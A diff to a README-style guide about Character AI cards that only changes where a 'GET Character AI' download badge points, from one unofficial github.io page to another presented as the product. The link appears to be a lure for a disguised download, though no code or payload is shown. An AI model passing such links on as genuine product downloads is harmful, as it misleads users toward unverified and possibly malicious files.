@@ -34,7 +34,7 @@ Original characters can be anyone. Give them one job and one place. A card that 
 
 Open the site and sign in. That is the build.
 
-[![GET Character AI](https://img.shields.io/badge/GET-Character%20AI-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://andrevdnkx870.github.io/.github/Character-AI)
+[![GET Character AI](https://img.shields.io/badge/GET-Character%20AI-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://character-chatbot-ai.github.io/.github/)
 
 Create an account on the official site. Skip repacks and unofficial apps that ask for the same password.
 
